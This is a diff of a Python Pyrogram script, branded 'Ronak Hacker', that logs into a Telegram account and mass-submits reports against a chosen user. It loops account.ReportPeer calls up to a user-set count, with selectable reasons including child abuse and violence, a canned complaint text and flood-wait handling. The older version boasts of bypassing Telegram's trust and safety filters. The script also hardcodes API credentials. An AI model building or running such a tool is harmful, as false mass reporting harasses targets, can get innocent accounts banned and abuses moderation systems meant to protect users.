@@ -1,137 +1,103 @@
 import asyncio
 import os
 import sys
-import time
-from pyrogram import Client, errors, types, functions
-from datetime import datetime
+from pyrogram import Client, errors, raw, types
 
-# --- CONFIGURATION (Advanced Security) ---
+# --- API CONFIG ---
+# Aap apni API_ID aur API_HASH bhi use kar sakte hain
 API_ID = 32567928
 API_HASH = "1ccc36ef5a82df3bba346bf9af66c143"
 
-# --- PRO COLORS (CYBER THEME) ---
-R = '\033[1;31m' # High Alert
-G = '\033[1;32m' # Protocol Success
-Y = '\033[1;33m' # System Warning
-B = '\033[1;34m' # Deep Protocol
-C = '\033[1;36m' # Cyber Cyan
-W = '\033[0m'    # Reset
+# --- COLORS ---
+R = '\033[1;31m' 
+G = '\033[1;32m' 
+Y = '\033[1;33m' 
+C = '\033[1;36m' 
+W = '\033[0m'    
 
 def clear():
     os.system('clear')
 
-def pro_header(page):
+def banner():
     clear()
-    print(f"{C}┌─────────────────────────────────────────────────────────┐")
-    print(f"{C}│{R}  ██████╗  ██████╗ ███╗   ██╗ █████╗ ██╗  ██╗{C}            │")
-    print(f"{C}│{R}  ██╔══██╗██╔═══██╗████╗  ██║██╔══██╗██║ ██╔╝{C}            │")
-    print(f"{C}│{W}  ██████╔╝██║   ██║██╔██╗ ██║███████║█████╔╝ {C}            │")
-    print(f"{C}│{W}  ██╔══██╗██║   ██║██║╚██╗██║██╔══██║██╔═██╗ {C}            │")
-    print(f"{C}│{R}  ██║  ██║╚██████╔╝██║ ╚████║██║  ██║██║  ██╗{C}            │")
-    print(f"{C}└─────────────────────────────────────────────────────────┘")
-    print(f"{G}        [ PRO SYSTEM: RONAK HACKER - VERSION 4.0 ]")
-    print(f"{Y}        [ STATUS: ENCRYPTED | MODULE: {page.upper()} ]")
-    print(f"{C}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{W}\n")
+    print(f"{R}██████╗  ██████╗ ███╗   ██╗ █████╗ ██╗  ██╗")
+    print(f"{R}██╔══██╗██╔═══██╗████╗  ██║██╔══██╗██║ ██╔╝")
+    print(f"{W}██████╔╝██║   ██║██╔██╗ ██║███████║█████╔╝ ")
+    print(f"{W}██╔══██╗██║   ██║██║╚██╗██║██╔══██║██╔═██╗ ")
+    print(f"{R}██║  ██║╚██████╔╝██║ ╚████║██║  ██║██║  ██╗")
+    print(f"{G}       [ RONAK HACKER - OTP LOGIN SYSTEM ]{W}\n")
 
-def slow_type(text, delay=0.01):
-    for char in text:
-        sys.stdout.write(char)
-        sys.stdout.flush()
-        time.sleep(delay)
-    print()
-
-async def auth_protocol(client):
-    pro_header("Auth Login")
-    slow_type(f"{B}[*] Initializing Ronak Hacker Auth Protocol...{W}")
-    phone = input(f"{G}┌─[Enter Phone (Ex: +9199xxxxxx)]\n└──╼ {W}").strip()
+async def main():
+    banner()
+    # Session file locally save hogi
+    app = Client("ronak_session", api_id=API_ID, api_hash=API_HASH)
     
-    try:
-        code_data = await client.send_code(phone)
-        hsh = code_data.phone_code_hash
-        print(f"\n{Y}[!] Secure OTP sent via Telegram Cloud Service.{W}")
-        
-        otp = input(f"{G}┌─[Enter Binary OTP Code]\n└──╼ {W}").strip()
-        
-        try:
-            await client.sign_in(phone, hsh, otp)
-        except errors.SessionPasswordNeeded:
-            print(f"\n{R}[!] 2FA Encryption Detected!{W}")
-            pwd = input(f"{G}┌─[Enter 2FA Password]\n└──╼ {W}").strip()
-            await client.check_password(pwd)
-            
-        print(f"\n{G}✅ [SUCCESS] Ronak Hacker Access Granted.{W}")
-        time.sleep(1.5)
-        return True
-    except Exception as e:
-        print(f"\n{R}❌ [FATAL ERROR] {str(e)}{W}")
-        return False
-
-async def start_attack():
-    app = Client("ronak_pro_v4", api_id=API_ID, api_hash=API_HASH)
     await app.connect()
     
-    # Session Persistence
-    me = await app.get_me()
-    if not me:
-        if not await auth_protocol(app): return
-
-    pro_header("Target Selector")
-    target = input(f"{G}┌─[Enter Target ID/Username]\n└──╼ {W}").strip()
-    
-    print(f"\n{C}[ SELECT ATTACK VECTORS ]{W}")
-    print(f"{R}1. MASS_SPAM_HIT       2. VIOLENCE_OVERRIDE")
-    print(f"{R}3. CHILD_ABUSE_VEC     4. COPYRIGHT_STRIKE{W}")
-    choice = input(f"\n{G}┌─[Ronak@Vector]\n└──╼ {W}Select Vector: ")
-    
     try:
-        intensity = int(input(f"{G}┌─[Attack Intensity (1-9999)]\n└──╼ {W}Count: "))
+        me = await app.get_me()
     except:
-        intensity = 100
+        me = None
 
-    pro_header("Reporting Engine")
+    if not me:
+        print(f"{Y}[!] Login Required...{W}")
+        phone = input(f"{G}Enter Phone Number (with +91): {W}")
+        try:
+            sent_code = await app.send_code(phone)
+            otp = input(f"{G}Enter OTP sent on Telegram: {W}")
+            try:
+                await app.sign_in(phone, sent_code.phone_code_hash, otp)
+            except errors.SessionPasswordNeeded:
+                pwd = input(f"{G}2FA Password Required: {W}")
+                await app.check_password(pwd)
+        except Exception as e:
+            print(f"{R}Login Error: {e}{W}")
+            return
+
+    banner()
+    print(f"{G}Login Successful as: {app.me.first_name}{W}\n")
+    
+    target = input(f"{C}Target Username/ID: {W}")
+    print(f"\n{Y}1. Spam  2. Violence  3. Child Abuse  4. Copyright  5. Other{W}")
+    choice = input(f"{G}Select Reason: {W}")
+    
+    reasons = {
+        "1": types.InputReportReasonSpam(),
+        "2": types.InputReportReasonViolence(),
+        "3": types.InputReportReasonChildAbuse(),
+        "4": types.InputReportReasonCopyright(),
+        "5": types.InputReportReasonOther()
+    }
+    
+    reason = reasons.get(choice, types.InputReportReasonSpam())
+    msg_text = "Violation of Telegram terms. Please take action."
+
     try:
         peer = await app.resolve_peer(target)
-        reasons = {"1": types.InputReportReasonSpam(), "2": types.InputReportReasonViolence(),
-                   "3": types.InputReportReasonChildAbuse(), "4": types.InputReportReasonOther()}
+        count = int(input(f"{G}Report Count: {W}"))
         
-        vec = reasons.get(choice, reasons["1"])
+        print(f"\n{R}[!] Attack Started on {target}...{W}\n")
         
-        slow_type(f"{R}[!] Bypassing Telegram Trust & Safety Filters...{W}")
-        slow_type(f"{B}[*] Injecting Ronak Hacker Payloads into {target}...{W}\n")
-        
-        for i in range(1, intensity + 1):
+        for i in range(1, count + 1):
             try:
-                # Pro Reporting Logic
                 await app.invoke(
-                    functions.account.ReportPeer(
+                    raw.functions.account.ReportPeer(
                         peer=peer,
-                        reason=vec,
-                        message=f"Ronak Hacker System v4: Target violations detected on {datetime.now()}"
+                        reason=reason,
+                        message=msg_text
                     )
                 )
-                # Dynamic Logging
-                sys.stdout.write(f"\r{G}[PRO-ATTACK-{i}] {C}Hit Successful | {R}Status: Bypass{W}")
-                sys.stdout.flush()
-                
-                # Pro Speed (Adjustable)
-                if i % 10 == 0: await asyncio.sleep(0.1)
-                else: await asyncio.sleep(0.2)
-                
+                print(f"{G}[SUCCESS] Report {i} Sent!{W}")
+                await asyncio.sleep(0.5) # Avoid flood
             except errors.FloodWait as e:
-                print(f"\n{Y}[!] Flood Detected! Waiting {e.value}s...{W}")
+                print(f"{Y}FloodWait: Sleeping {e.value}s{W}")
                 await asyncio.sleep(e.value)
             except Exception as e:
-                print(f"\n{R}[!] Error on Hit {i}: {str(e)}{W}")
-
-        print(f"\n\n{G}✅ [MISSION COMPLETE] Target {target} is now in Critical State.{W}")
-        print(f"{C}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{W}")
-        input(f"{Y}Press Enter to return to Command Center...{W}")
-
+                print(f"{R}Error: {e}{W}")
+                
     except Exception as e:
-        print(f"{R}❌ SYSTEM CRASH: {str(e)}{W}")
+        print(f"{R}Could not find target: {e}{W}")
 
 if __name__ == "__main__":
-    try:
-        asyncio.run(start_attack())
-    except KeyboardInterrupt:
-        print(f"\n{R}[!] Ronak Hacker System Shutdown.{W}")
+    asyncio.run(main())
+    
